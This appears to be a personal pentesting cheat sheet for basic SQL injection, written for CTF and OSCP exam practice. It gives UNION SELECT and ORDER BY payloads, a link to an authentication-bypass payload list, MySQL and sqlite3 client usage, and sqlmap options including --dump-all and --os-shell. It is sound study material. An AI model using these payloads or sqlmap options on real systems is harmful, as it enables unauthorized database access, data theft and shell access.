# sqli basic

## Auth bypass

[iamkashz/ctf-scripts/auth-bypass-sqli.txt](https://github.com/iamkashz/ctf-scripts/blob/main/auth-bypass-sqli.txt)

## Tips

```bash
# when error; available columns = N-1
ORDER BY <N>--

# union [all] select 
UNION [ALL] SELECT 1,2,3,4-- -
UNION [ALL] SELECT NULL,NULL,NULL,NULL-- -
```

## Using mysql-client

```bash
mysql -h <host-ip> [-P PORT]-u <username> -p [-e <SQL-QUERY-TO-RUN>]

mysqldump -u <user> -p <DB-name> > dump.mysql
mysqldump -u <user> -p --all-databases > dump.mysql
```

## sqlite3

```bash
# to invoke SQLite
sqlite3 <db.dump>

# to find tables
sqlite> .tables

# to check schema for table
sqlite> PRAGMA table_info(<table-name>);

# Ctrl+D to break out
```

## Start Mysql on kali

```bash
service mysql [status | start | stop]
/etc/mysql/mariadb.conf.d/50-server.cnf

CREATE USER 'kashz'@'localhost' IDENTIFIED BY 'kali1';
GRANT ALL ON *.* TO 'kashz'@'localhost';
flush privileges;

# listen on 3306 from tun0 IP and route to 3306 via localhost
$ socat TCP-LISTEN:3306,fork,bind=10.10.16.161 TCP:127.0.0.1:3306
```

## SQLMAP (DO NOT USE IN OSCP)

```bash
# method: POST
# capture request via burp > sql.txt

sqlmap -r <sql.txt> -p <paramter-to-check> <flag> [--proxy=http://127.0.0.1:808]

# --dbms=<mysql> or other.
# --dbs; -D <db>
# --tables; -T <table>
# --dump-all
# --os-shell
```
